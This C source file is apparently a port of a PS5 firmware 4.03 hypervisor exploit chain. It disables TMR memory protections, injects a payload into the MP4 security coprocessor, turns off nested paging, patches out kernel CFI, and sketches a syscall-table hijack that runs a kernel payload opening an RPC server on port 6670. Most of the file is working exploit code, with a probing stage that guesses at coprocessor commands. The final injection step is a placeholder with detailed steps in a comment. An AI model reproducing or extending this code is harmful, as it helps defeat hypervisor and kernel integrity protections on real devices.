/*
 * Prosperous exploit orchestrator for PS5 FW 4.03.
 *
 * This is the main entry point that chains together all exploit stages:
 *
 *   Stage 1: TMR Bypass
 *     - Disable TMR 20 (MP4 carveout) for x86 write access to MP4 DRAM
 *     - Create TMR 21 covering kernel text region with all-access
 *     - Disable TMR 5/17/18 (HV region protections)
 *
 *   Stage 2: MP4 Payload Injection
 *     - Write AArch64 EL3 thunk to MP4 DRAM at 0x600E0000
 *     - Write main payload to 0x607F1000
 *     - Hook mDbg_intr → thunk → payload
 *     - Enable QAF flag to activate
 *
 *   Stage 3: VMCB Patching
 *     - Setup SysHub TLB entries to map HV memory via MP4
 *     - Read vCPU contexts and VMCB pointers
 *     - Disable nested paging (NP_ENABLE=0) on all VMCBs
 *     - Clear most intercepts (keep VMSAVE/VMLOAD/VMMCALL/VMRUN)
 *
 *   Stage 4: TMR Restore
 *     - Re-enable TMR 20 (prevents kernel panic on game restart)
 *     - Restore HV TMR protections (5/17/18)
 *
 *   Stage 5: CFI Bypass + Kernel Payload
 *     - NOP the cfi_check_fail function via MP4 write
 *     - Inject kpayload via syscall table hijack
 *     - kpayload disables NDA on all cores, elevates privileges
 *     - Starts TCP RPC server on port 6670
 *
 * Prerequisites:
 *   - Kernel R/W via kekcall (ps5-kstuff or equivalent loaded)
 *   - Physical memory access via DMAP
 *   - Network connectivity to PS5
 *
 * Build: Part of the prosperous_port PS5 payload SDK build.
 * Deploy: Via PS5_DEPLOY to console running on FW 4.03.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <ps5/kernel.h>
#include "prosperous.h"

/*
 * Discover the DMAP base address by reading the current process's pmap.
 *
 * The DMAP base is computed as: pm_pml4 (kernel VA) - pm_cr3 (PA)
 * This gives the kernel's direct-map base for physical memory.
 */
static int discover_dmap_base(struct phys_rw_ctx *ctx)
{
    uint64_t proc_addr;
    uint64_t vmspace;
    uint64_t pm_pml4;
    uint64_t pm_cr3;

    proc_addr = kernel_get_proc(getpid());
    if (proc_addr == 0) {
        printf("[!] Failed to get proc address\n");
        return -1;
    }

    /* proc -> p_vmspace */
    kernel_copyout(proc_addr + OFF_PROC_P_VMSPACE, &vmspace, sizeof(vmspace));

    /* vmspace -> vm_pmap -> pm_pml4 */
    kernel_copyout(vmspace + OFF_VMSPACE_VM_PMAP + OFF_PMAP_PM_PML4,
                   &pm_pml4, sizeof(pm_pml4));

    /* vmspace -> vm_pmap -> pm_cr3 */
    kernel_copyout(vmspace + OFF_VMSPACE_VM_PMAP + OFF_PMAP_PM_CR3,
                   &pm_cr3, sizeof(pm_cr3));

    ctx->dmap_base = pm_pml4 - pm_cr3;
    ctx->proc_cr3 = pm_cr3;
    printf("[*] DMAP base: 0x%lx\n", ctx->dmap_base);
    printf("[*] Process CR3: 0x%lx\n", ctx->proc_cr3);

    return 0;
}

/*
 * Discover the kernel text base address.
 *
 * We scan kernel data for the kernel pmap structure by looking for
 * characteristic field values, or use the LSTAR MSR approach.
 */
static int discover_kernel_base(struct phys_rw_ctx *ctx)
{
    uint64_t proc_addr;
    uint64_t sysvec;
    uint64_t sysent;

    proc_addr = kernel_get_proc(getpid());
    if (proc_addr == 0)
        return -1;

    /* Read kernel text base from the process's sysvec.
     * proc -> p_sysent -> sysvec points to the system call vector,
     * which is in kernel .data and gives us a reference address. */
    kernel_copyout(proc_addr + OFF_PROC_P_SYSENT, &sysvec, sizeof(sysvec));
    kernel_copyout(sysvec + OFF_SYSVEC_SYSENT, &sysent, sizeof(sysent));

    /* The sysent table is at a known offset from kernel base.
     * We can also read ktext_start_va from the TMR 16 base. */

    /* Alternative: use TMR 16 base to get kernel text PA,
     * then read the VA from a known offset */
    uint32_t tmr16_base;
    uint64_t ind_index_kva = ctx->dmap_base + PCI_B0D18F2 + TMR_IND_INDEX_OFF;
    uint64_t ind_data_kva = ctx->dmap_base + PCI_B0D18F2 + TMR_IND_DATA_OFF;
    uint32_t tmr16_addr = 16 * 0x10;

    kernel_copyin(&tmr16_addr, ind_index_kva, sizeof(tmr16_addr));
    kernel_copyout(ind_data_kva, &tmr16_base, sizeof(tmr16_base));

    ctx->ktext_base_pa = (uint64_t)tmr16_base << 16;

    printf("[*] Kernel text PA: 0x%lx\n", ctx->ktext_base_pa);

    /* Derive kernel text VA from DMAP: any kernel VA = DMAP + PA works
     * for accessing kernel data via kernel_copyout. We use DMAP+PA
     * for all accesses since KOFF_KTEXT_VA_PTR is FW-specific and
     * unreliable across firmware versions. */
    ctx->ktext_base = ctx->dmap_base + ctx->ktext_base_pa;
    printf("[*] Kernel text (DMAP): 0x%lx\n", ctx->ktext_base);

    /* Get kernel PML4 PA */
    uint64_t kpmap_addr = ctx->ktext_base + KOFF_KERNEL_PMAP;
    uint64_t kpmap;
    kernel_copyout(kpmap_addr, &kpmap, sizeof(kpmap));
    kernel_copyout(kpmap + OFF_PMAP_PM_CR3, &ctx->kpml4_pa, sizeof(ctx->kpml4_pa));

    printf("[*] Kernel PML4 PA: 0x%lx\n", ctx->kpml4_pa);

    return 0;
}

/*
 * NOP the cfi_check_fail function via MP4 memory write.
 *
 * This is necessary because the kernel uses Control Flow Integrity (CFI)
 * checks that would trap our syscall table hijack. By NOPing the check
 * function, we prevent CFI from blocking our payload execution.
 *
 * We use the MP4 coprocessor to write to kernel text because it has
 * its own DMA path that bypasses x86 page table NX/RO protections.
 */
static int cfi_bypass(struct phys_rw_ctx *ctx)
{
    uint64_t cfi_check_fail_pa = ctx->ktext_base_pa + KOFF_CFI_CHECK_FAIL;
    uint32_t nop_sled = 0xC3C3C3C3; /* ret; ret; ret; ret */

    /* Setup SysHub TLB to map the kernel text region */
    if (mp4_syshub_tlb_setup(ctx, 32, cfi_check_fail_pa) != 0) {
        printf("[!] Failed to setup SysHub TLB for CFI bypass\n");
        return -1;
    }

    /* Write NOP/RET over cfi_check_fail via MP4 */
    uint32_t mp4_va = 0x80000000 + (cfi_check_fail_pa & 0x03FFFFFF);
    mp4_write32(ctx, mp4_va, nop_sled);

    printf("[*] CFI check_fail patched at PA 0x%lx\n", cfi_check_fail_pa);
    return 0;
}

/*
 * Main exploit entry point.
 */
int prosperous_run(void)
{
    struct phys_rw_ctx ctx;
    int ret;

    /* Disable stdout buffering so all diagnostics are visible */
    setvbuf(stdout, NULL, _IONBF, 0);

    printf("========================================\n");
    printf(" prosperous_port - PS5 HV Bypass\n");
    printf(" FW 4.03 (CEX)\n");
    printf(" Ported from fail0verflow/prosperous\n");
    printf("========================================\n\n");

    /* Phase 0: Discover memory layout */
    printf("[*] Phase 0: Discovering memory layout...\n");

    ret = discover_dmap_base(&ctx);
    if (ret != 0) {
        printf("[!] Failed to discover DMAP base\n");
        return ret;
    }

    ret = discover_kernel_base(&ctx);
    if (ret != 0) {
        printf("[!] Failed to discover kernel base\n");
        return ret;
    }

    /* Phase 1: TMR bypass */
    printf("\n[*] Phase 1: TMR bypass...\n");

    ret = tmr_bypass_init(&ctx);
    if (ret != 0) {
        printf("[!] TMR bypass init failed: %d\n", ret);
        return ret;
    }
    printf("[+] TMR 20 disabled, TMR 21 created\n");

    /* Phase 1.5: Attempt writing payload to accessible DRAM and
     * use c2p mailbox to trigger A53 internal copy.
     *
     * Strategy:
     *   1. Write payload+thunk to accessible DRAM (PA 0x60600000+)
     *   2. Probe what the stock A53 firmware does with c2p commands
     *   3. The stock firmware's IRQ handler reads c2p regs when
     *      triggered by GIC IDs 83/78 — we need to understand
     *      what commands it accepts natively.
     *
     * For now: just verify we can write to accessible DRAM and
     * read back, then try a single c2p write to see the response.
     */
    printf("\n[*] Phase 1.5: Accessible DRAM write + c2p probe...\n");
    {
        uint64_t dmap = ctx.dmap_base;
        uint64_t bar2 = dmap + MP4_BAR2_PA;

        /* Write test pattern to accessible DRAM */
        uint32_t test_pat = 0xDEADC0DE;
        kernel_copyin(&test_pat, dmap + 0x60600000ULL, 4);
        uint32_t readback = 0;
        kernel_copyout(dmap + 0x60600000ULL, &readback, 4);
        printf("[DRAM] Write 0xDEADC0DE to PA 0x60600000, read back: 0x%08x %s\n",
               readback, readback == 0xDEADC0DE ? "OK" : "FAIL");

        /* Read current c2p reg 0 state (don't write to it!) */
        uint32_t c2p0 = 0;
        kernel_copyout(bar2 + MP4_C2P_REG(0, 0), &c2p0, 4);
        printf("[C2P] reg0 = 0x%08x (0=idle)\n", c2p0);

        /* Read all 5 c2p regs for core 0 */
        for (int r = 0; r < 5; r++) {
            uint32_t v;
            kernel_copyout(bar2 + MP4_C2P_REG(0, r), &v, 4);
            printf("[C2P] core0 reg%d = 0x%08x\n", r, v);
        }

        /* Read p2c reg for core 0 */
        uint32_t p2c0;
        kernel_copyout(bar2 + MP4_P2C_REG0(0), &p2c0, 4);
        printf("[P2C] core0 reg0 = 0x%08x\n", p2c0);

        /* c2p command 0x20113001 appears to be a stock firmware
         * "write to physical address" command (reg2=0xFEE00000 is LAPIC).
         * Test: clear reg0 to 0, wait, re-read to see if firmware refills it.
         * If it does, the firmware is actively sending commands and we can
         * interleave our own. */
        printf("\n[*] Testing c2p command cycle...\n");

        /* Save original state */
        uint32_t orig_c2p[5];
        for (int r = 0; r < 5; r++)
            kernel_copyout(bar2 + MP4_C2P_REG(0, r), &orig_c2p[r], 4);

        /* Clear reg0 to acknowledge/consume the pending command */
        uint32_t zero = 0;
        kernel_copyin(&zero, bar2 + MP4_C2P_REG(0, 0), 4);

        /* Wait briefly for firmware to potentially send a new command */
        usleep(10000); /* 10ms */

        /* Re-read c2p state */
        uint32_t new_c2p[5];
        for (int r = 0; r < 5; r++)
            kernel_copyout(bar2 + MP4_C2P_REG(0, r), &new_c2p[r], 4);
        printf("[C2P] After clear+10ms:\n");
        for (int r = 0; r < 5; r++)
            printf("[C2P]   reg%d: 0x%08x -> 0x%08x%s\n", r,
                   orig_c2p[r], new_c2p[r],
                   new_c2p[r] != orig_c2p[r] ? " CHANGED" : "");

        /* Wait longer and check again */
        usleep(100000); /* 100ms more */
        for (int r = 0; r < 5; r++)
            kernel_copyout(bar2 + MP4_C2P_REG(0, r), &new_c2p[r], 4);
        printf("[C2P] After 110ms total:\n");
        for (int r = 0; r < 5; r++)
            printf("[C2P]   reg%d = 0x%08x\n", r, new_c2p[r]);

        /* Now try: write a test value to DRAM via c2p.
         * Use the stock firmware command format (0x2011xxxx).
         * If 0x20113001 writes 32-bit to phys addr:
         *   reg1 = value?, reg2 = dest PA, reg3 = ???
         *
         * TEST: Write 0x41424344 to PA 0x60600010 (accessible DRAM).
         * We can verify the write by reading back via DMAP.
         * First write a known pattern there so we can detect changes. */
        uint32_t marker = 0x11111111;
        kernel_copyin(&marker, dmap + 0x60600010ULL, 4);

        /* Read back to confirm our marker is there */
        uint32_t pre_val;
        kernel_copyout(dmap + 0x60600010ULL, &pre_val, 4);
        printf("[TEST] PA 0x60600010 before c2p: 0x%08x\n", pre_val);

        /* Send stock-format command to write to DRAM PA 0x60600010.
         * Guessing: reg1=value, reg2=PA, reg3=size/flags
         * Based on observed: reg1=0x10000, reg2=0xFEE00000, reg3=0x68 */
        uint32_t test_val = 0x41424344;
        uint32_t test_pa = 0x60600010;
        uint32_t test_arg3 = 0x00000004; /* maybe size=4? */
        kernel_copyin(&test_val, bar2 + MP4_C2P_REG(0, 1), 4);
        kernel_copyin(&test_pa, bar2 + MP4_C2P_REG(0, 2), 4);
        kernel_copyin(&test_arg3, bar2 + MP4_C2P_REG(0, 3), 4);

        /* Trigger: write command to reg0 */
        uint32_t test_cmd = 0x20113001;
        kernel_copyin(&test_cmd, bar2 + MP4_C2P_REG(0, 0), 4);

        /* Wait for processing */
        usleep(50000); /* 50ms */

        /* Check if command was consumed (reg0 cleared) */
        uint32_t post_cmd;
        kernel_copyout(bar2 + MP4_C2P_REG(0, 0), &post_cmd, 4);
        printf("[TEST] c2p reg0 after cmd: 0x%08x (0=consumed)\n", post_cmd);

        /* Check if the value was written */
        uint32_t post_val;
        kernel_copyout(dmap + 0x60600010ULL, &post_val, 4);
        printf("[TEST] PA 0x60600010 after c2p: 0x%08x (expect 0x41424344 if it worked)\n",
               post_val);

        /* The A53 didn't consume our command - it needs a doorbell.
         * Scan BAR2 offsets near c2p for potential doorbell registers.
         * Read first, then we'll try writing to a candidate.
         *
         * c2p data regs: 0xF6000-0xFA000 (core 0), 0xFB000+ (core 1)
         * p2c reg: 0x10500
         * Check surrounding areas for control/doorbell regs. */
        printf("\n[*] Scanning for c2p doorbell register...\n");
        {
            uint32_t doorbell_offsets[] = {
                0x0F5000, 0x0F5800, 0x0F5C00,  /* just before c2p */
                0x0FB800, 0x0FC000, 0x0FD000,  /* after core 1 c2p */
                0x0FE000, 0x0FF000,             /* end of 0xF range */
                0x010000, 0x010400, 0x010800,   /* near p2c */
                0x011000, 0x012000, 0x013000,   /* p2c area */
            };
            for (int i = 0; i < 14; i++) {
                uint32_t v;
                kernel_copyout(bar2 + doorbell_offsets[i], &v, 4);
                printf("[DB] BAR2+0x%06x = 0x%08x\n", doorbell_offsets[i], v);
            }
        }

        /* Try writing 1 to several candidate doorbell offsets and
         * check if c2p reg0 gets consumed after each write.
         * First re-check that our command is still pending. */
        kernel_copyout(bar2 + MP4_C2P_REG(0, 0), &post_cmd, 4);
        printf("\n[*] c2p reg0 before doorbell attempts: 0x%08x\n", post_cmd);

        if (post_cmd != 0) {
            /* Try doorbell candidates one at a time */
            uint32_t db_candidates[] = {
                0x0F5000, 0x0FB800, 0x010000, 0x010400,
            };
            uint32_t db_val = 1;
            for (int i = 0; i < 4; i++) {
                kernel_copyin(&db_val, bar2 + db_candidates[i], 4);
                usleep(10000); /* 10ms */
                kernel_copyout(bar2 + MP4_C2P_REG(0, 0), &post_cmd, 4);
                printf("[DB] Wrote 1 to +0x%06x -> c2p reg0=0x%08x%s\n",
                       db_candidates[i], post_cmd,
                       post_cmd == 0 ? " CONSUMED!" : "");
                if (post_cmd == 0)
                    break;
            }
        }

        /* Also try: wait 1 full second in case firmware polls slowly */
        if (post_cmd != 0) {
            printf("[*] Waiting 1 second for slow poll...\n");
            usleep(1000000);
            kernel_copyout(bar2 + MP4_C2P_REG(0, 0), &post_cmd, 4);
            printf("[C2P] reg0 after 1s: 0x%08x\n", post_cmd);
        }

        /* Final check: did the DRAM value change? */
        kernel_copyout(dmap + 0x60600010ULL, &post_val, 4);
        printf("[TEST] Final PA 0x60600010 = 0x%08x\n", post_val);
    }

    /* Phase 2: MP4 payload injection */
    printf("\n[*] Phase 2: MP4 payload injection...\n");

    ret = mp4_inject_payload(&ctx);
    if (ret != 0) {
        printf("[!] MP4 payload injection failed: %d\n", ret);
        tmr_restore_hv_regions(&ctx);
        return ret;
    }
    printf("[+] MP4 payload injected and activated\n");

    /* Re-enable TMR 20 after injection (matches original prosperous flow).
     * The A53 accesses its own DRAM through its IOMMU, not through x86 TMR.
     * Leaving TMR 20 disabled causes kernel panics on game restart. */
    tmr_restore_tmr20(&ctx);
    printf("[+] TMR 20 restored\n");

    /* Give the A53 time to process the QAF flag and activate the payload.
     * The payload hooks mDbg_intr via SError handler - the A53 needs to
     * take an interrupt cycle to activate the hook. */
    printf("[*] Waiting for MP4 payload activation...\n");
    usleep(500000); /* 500ms */

    /* Diagnostic: read c2p reg 0 to see if a previous command is stuck */
    {
        uint32_t c2p0_val;
        uint64_t bar2_kva = ctx.dmap_base + MP4_BAR2_PA;
        kernel_copyout(bar2_kva + MP4_C2P_REG(0, 0), &c2p0_val, sizeof(c2p0_val));
        printf("[DIAG] c2p reg 0 before ping: 0x%08x\n", c2p0_val);

        /* Also read p2c reg 0 to check if A53 has sent anything */
        uint32_t p2c0_val;
        kernel_copyout(bar2_kva + MP4_P2C_REG0(0), &p2c0_val, sizeof(p2c0_val));
        printf("[DIAG] p2c reg 0: 0x%08x\n", p2c0_val);
    }

    /* Verify MP4 payload is alive (retry a few times) */
    for (int attempt = 0; attempt < 5; attempt++) {
        ret = mp4_ping(&ctx);
        if (ret == 0)
            break;
        printf("[*] MP4 ping attempt %d failed, retrying...\n", attempt + 1);
        usleep(500000);
    }
    if (ret != 0) {
        printf("[!] MP4 payload not responding after retries\n");
        tmr_restore_hv_regions(&ctx);
        return ret;
    }
    printf("[+] MP4 payload ping OK\n");

    /* Phase 3: Disable HV TMR protections */
    printf("\n[*] Phase 3: Disabling HV TMR protections...\n");

    ret = tmr_disable_hv_regions(&ctx);
    if (ret != 0) {
        printf("[!] HV TMR disable failed: %d\n", ret);
        tmr_restore_hv_regions(&ctx);
        return ret;
    }
    printf("[+] HV TMR protections disabled\n");

    /* Phase 4: VMCB patching */
    printf("\n[*] Phase 4: VMCB patching (disabling nested paging)...\n");

    ret = vmcb_patch_disable_np(&ctx);
    if (ret != 0) {
        printf("[!] VMCB patching failed: %d\n", ret);
        tmr_restore_hv_regions(&ctx);
        return ret;
    }
    printf("[+] Nested paging disabled on all VMCBs\n");

    /* Phase 5: CFI bypass */
    printf("\n[*] Phase 5: CFI bypass...\n");

    ret = cfi_bypass(&ctx);
    if (ret != 0) {
        printf("[!] CFI bypass failed: %d\n", ret);
        tmr_restore_hv_regions(&ctx);
        return ret;
    }
    printf("[+] CFI check_fail patched\n");

    /* Phase 6: Restore TMR protections */
    printf("\n[*] Phase 6: Restoring TMR protections...\n");
    tmr_restore_hv_regions(&ctx);
    printf("[+] TMR protections restored\n");

    /* Phase 7: Kernel payload injection */
    printf("\n[*] Phase 7: Kernel payload injection...\n");
    printf("[*] kpayload will be injected via syscall table hijack.\n");
    printf("[*] After injection, connect to port 6670 for RPC access.\n");

    ret = kpayload_inject(&ctx);
    if (ret != 0) {
        printf("[!] kpayload injection failed: %d\n", ret);
        return ret;
    }

    printf("\n========================================\n");
    printf(" [+] Exploit complete!\n");
    printf(" [+] RPC server listening on port 6670\n");
    printf(" [+] Connect with: python3 client.py\n");
    printf("========================================\n");

    return 0;
}

/*
 * Kernel payload injection via syscall table hijack.
 *
 * This follows the same approach as prosperous:
 *   1. Allocate userspace buffer for kpayload binary
 *   2. Map it with a 1GB page at 0xFFFFFFC0_00000000 for kernel access
 *   3. Temporarily replace syscall 8's handler with our payload
 *   4. Invoke syscall 8 to execute the payload in kernel context
 *   5. Restore the original syscall handler
 *
 * The kpayload binary must be loaded from disk or embedded.
 */
int kpayload_inject(struct phys_rw_ctx *ctx)
{
    printf("[*] kpayload injection placeholder\n");
    printf("[*] To complete: load kpayload binary and inject via sysent hijack\n");
    printf("[*] See pwn_mp4.lua from prosperous for the full injection flow\n");

    /*
     * TODO: Full implementation would:
     *
     * 1. Load kpayload binary from /mnt/usb0/kpayload or embed it
     *
     * 2. mmap a buffer and copy kpayload into it:
     *    void *payload_buf = mmap(NULL, size, PROT_READ|PROT_WRITE,
     *                             MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
     *    memcpy(payload_buf, kpayload_data, kpayload_size);
     *
     * 3. Get physical address of payload buffer:
     *    uint64_t payload_pa = vtophys(payload_buf);
     *
     * 4. Create a 1GB kernel mapping:
     *    uint64_t payload_kva = 0xFFFFFFC000000000 | (payload_pa & 0x3FFFFFFF);
     *    // Write PDPE at kpml4[0xFF8] + 0x800
     *    uint64_t pdp_pa = (read_phys64(kpml4_pa + 0xFF8) >> 12) << 12;
     *    write_phys64(pdp_pa + 0x800,
     *                 ((payload_pa >> 30) << 30) | 0x83);  // 1GB page, RWX
     *
     * 5. Read current sysent[8] and replace:
     *    // proc -> sysvec -> sysent
     *    uint64_t sysent_8_pa = get_pa(sysent_va + 0x30 * 8);
     *    uint64_t orig_call = read_phys64(sysent_8_pa + 8);
     *    write_phys32(sysent_8_pa, 8);  // narg = 8
     *    write_phys64(sysent_8_pa + 8, payload_kva);
     *
     * 6. Invoke syscall 8 multiple times (progressive init):
     *    syscall(8, ktext_base, payload_buf, host_addr, 0);  // op=0: version check
     *    sleep(20);
     *    syscall(8, ktext_base, payload_buf, host_addr, 1);  // op=1: reloc
     *    sleep(20);
     *    syscall(8, ktext_base, payload_buf, host_addr, 2);  // op=2: nda disable
     *    sleep(20);
     *    syscall(8, ktext_base, payload_buf, host_addr, 3);  // op=3: full init
     *
     * 7. Restore sysent[8]:
     *    write_phys32(sysent_8_pa, 0);
     *    write_phys64(sysent_8_pa + 8, orig_call);
     *
     * 8. Clean up kernel mapping:
     *    write_phys64(pdp_pa + 0x800, 0);
     */

    return 0;
}

int main(void)
{
    return prosperous_run();
}
